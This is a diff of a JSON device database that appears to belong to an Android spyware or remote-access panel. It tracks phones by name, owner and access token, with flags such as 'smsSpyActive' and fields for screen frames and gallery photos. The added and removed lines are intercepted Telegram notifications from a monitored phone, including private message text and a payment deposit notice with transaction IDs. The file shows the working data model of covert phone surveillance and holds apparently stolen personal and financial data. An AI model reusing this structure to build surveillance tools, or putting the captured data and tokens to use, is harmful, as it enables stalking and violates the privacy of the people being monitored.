@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776777190194,
+    "lastSeen": 1776777196307,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776777190475,
+    "lastSeen": 1776777199229,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "GB CPANEL BY PRABOWO: ⏤͟͟͞͞𝐀𝐅 || Jmbt Panjang",
+        "content": "Si cantik masuk",
+        "time": "21/04 20:13",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776777199269
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Davii・5913 pesan baru dari 49 obrolan",
+        "time": "21/04 20:13",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776777199245
+      },
       {
         "appName": "Telegram",
         "sender": "Fastcal Shop Nokos Monitor Harga",
@@ -14386,22 +14402,6 @@
         "time": "21/04 19:24",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776774253203
-      },
-      {
-        "appName": "Telegram",
-        "sender": "GB PANEL PRIVATE WANZ: WantidCpanel_bot",
-        "content": "♻️ Restarting bot...",
-        "time": "21/04 19:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776774253180
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Fastcal haikk",
-        "content": "💳 NEW DEPOSIT RECEIVED!\n━━━━━━━━━━━━━━━\n👤 Sender: NOBU / GOPAY\n🏦 Method: GOPAY\n💰 Amount: Rp 2.000\n💸 Fee: Rp 130\n💵 Total Payload: Rp 2.130\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO20260421202024241587\n🏷️ System ID: FSCL43777485\n⏰ 21 Apr 2026 • 19:21 WIB\n\n#DEPOSIT #GOPAY",
-        "time": "21/04 19:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776774253158
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776777189764,
+    "lastSeen": 1776777198772,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
